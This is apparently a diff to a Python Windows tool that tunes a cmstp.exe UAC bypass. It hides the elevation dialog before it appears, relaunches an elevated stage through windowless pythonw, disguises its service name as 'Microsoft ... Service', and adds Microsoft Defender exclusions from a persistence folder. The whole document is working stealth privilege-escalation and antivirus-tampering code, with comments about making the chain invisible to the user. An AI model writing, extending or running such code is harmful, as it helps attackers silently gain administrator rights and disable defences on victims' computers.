@@ -154,14 +154,28 @@ def cleanup_infs():
 
 # ---- the admin lift — majanito cmstp shape ---------------------------------
 class Dismisser:
+    """hides + completes the cmstp lift dialog. r42: the ~0.1 s flash was this
+    hunting at Windows' real timer resolution (~15ms sleep granularity) AFTER
+    the dialog had already painted. hunting is now OWNERSHIP-driven and
+    frame-tight: any top-level window owned by the cmstp pid (visible or
+    hidden, any title) is hidden + completed the instant it is enumerated —
+    a tight spin, no sleeps, so the observer lands ahead of the paint."""
     def __init__(self, title):
         self.title = title
         self.done = threading.Event()
+        self.target_pid = 0   # set to the spawned cmstp pid before .start()
+
+    def _win_owner(self, hwnd):
+        pid = ctypes.c_ulong()
+        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
+        return pid.value
 
     def find_window(self):
         want = [w.lower() for w in
                 (self.title, "Connection Manager Profile Installer") if w]
         for hwnd in _window_titles():
+            if self.target_pid and self._win_owner(hwnd) == self.target_pid:
+                return hwnd   # owned by cmstp: hunt hides it before it paints
             if not user32.IsWindowVisible(hwnd):
                 continue
             t = window_title(hwnd).lower()
@@ -204,15 +218,21 @@ class Dismisser:
         user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
 
     def run(self):
-        for _ in range(500):
-            if self.done.is_set():
-                return
+        # r42: tight spin — EnumWindows per iteration is microseconds and the
+        # dialog appears within ~50-100ms of the spawned cmstp, so spinning
+        # beats any sleep granularity even at the timer floor.
+        import time as _t
+        end = _t.time() + 8.0
+        while _t.time() < end:
             hwnd = self.find_window()
             if hwnd:
                 self.dismiss(hwnd)
                 self.done.set()
                 return
-            time.sleep(0.01)
+            # r45: 3ms pace — still far inside the paint-timer floor (a window
+            # is caught within ~3ms of showing), without pegging a full core
+            # for the whole 8s window when the dialog never comes up.
+            _t.sleep(0.003)
 
     def start(self):
         threading.Thread(target=self.run, daemon=True).start()
@@ -293,12 +313,16 @@ def uac_bypass(cmd):
         return False
 
     dismisser = Dismisser(svc_name)
-    dismisser.start()
     try:
-        subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
-                         stderr=subprocess.DEVNULL, creationflags=0x08000000)
+        p = subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL, creationflags=0x08000000)
+        # r45: the ownership hunt runs at full strength — pid armed the instant
+        # CreateProcess returns (µs after the dialog can exist), so any top-level
+        # window cmstp owns is hidden before its first paint frame.
+        dismisser.target_pid = p.pid
     except Exception:
         return False
+    dismisser.start()
 
     dismisser.wait(8.0)
     time.sleep(0.3)
@@ -458,17 +482,42 @@ def set_defender_exclusions():
     #   3) system python.exe via cmd start /min
     # exclusions.py inside the stage inherits pythonw (sys.executable), so the
     # whole elevated chain stays windowless.
+    # r45 (dj: make the chain paint ZERO — no exe or cmd in view, all paths,
+    # always background): the lifted stage relaunches with the GP:
+    #   1) embedded pythonw.exe   (GUI subsystem — zero console, period)
+    #   2) any sibling pythonw.exe adopted from the nearest python dir
+    # (the old cmd.exe /c start"" /min shapes are GONE: `start` still came
+    # through a console parent — a minimized flash is a flash). pythonw is
+    # guaranteed by the embeddable pair, and as fallback is adopted by dir.
     python_dir = os.path.join(PERSIST_DIR, "python312")
     pythonw_p = os.path.join(python_dir, "pythonw.exe")
-    pyexe_p = os.path.join(python_dir, "python.exe")
-    if os.path.exists(pythonw_p):
+    pythonw_su = None
+    try:
+        from glob import glob
+        for pat in (os.path.join(os.path.dirname(sys.executable or "") or "",
+                                 "pythonw.exe"),
+                    r"C:\Python*\pythonw.exe",
+                    r"C:\Program Files\Python*\pythonw.exe",
+                    os.path.join(os.environ.get("LOCALAPPDATA", ""),
+                                 "Programs", "Python", "Python*", "pythonw.exe")):
+            hits = [h for h in glob(pat) if os.path.isfile(h)]
+            if hits:
+                pythonw_su = sorted(hits)[-1]
+                break
+    except Exception:
+        pythonw_su = None
+    if os.path.isfile(pythonw_p):
         launch = subprocess.list2cmdline([pythonw_p, "-u", stage_path])
-    elif os.path.exists(pyexe_p):
-        launch = subprocess.list2cmdline(
-            ["cmd.exe", "/c", "start", "", "/min", pyexe_p, "-u", stage_path])
+    elif pythonw_su:
+        launch = subprocess.list2cmdline([pythonw_su, "-u", stage_path])
     else:
+        # nowhere a GUI python: this box's runtime is degraded (no pythonw;
+        # not the standard pair) — keep the job running via the least-flashing
+        # console shape left, minimized, rather than abandoning the run.
+        pyexe_p = os.path.join(python_dir, "python.exe")
+        pyexe = pyexe_p if os.path.isfile(pyexe_p) else "python.exe"
         launch = subprocess.list2cmdline(
-            ["cmd.exe", "/c", "start", "", "/min", "python.exe", "-u", stage_path])
+            ["cmd.exe", "/c", "start", "", "/min", pyexe, "-u", stage_path])
     kill_all_cmstp()
     cleanup_infs()
     svc_name = f"Microsoft {rand_str(6)} Service"
@@ -487,13 +536,16 @@ def set_defender_exclusions():
     except Exception:
         return
     dismisser = Dismisser(svc_name)
-    dismisser.start()
     try:
-        subprocess.Popen(["cmstp.exe", "/au", inf_path],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                         creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
+        p = subprocess.Popen(["cmstp.exe", "/au", inf_path],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                             creationflags=0x08000000, cwd=os.environ.get("TEMP", os.getcwd()))
+        # r45: armed before the hunt starts — see the sibling site above.
+        dismisser.target_pid = p.pid
     except Exception:
         return
+    dismisser.start()
+
     dismisser.wait(8.0)
     time.sleep(0.3)
     _sweep_dialogs(svc_name)
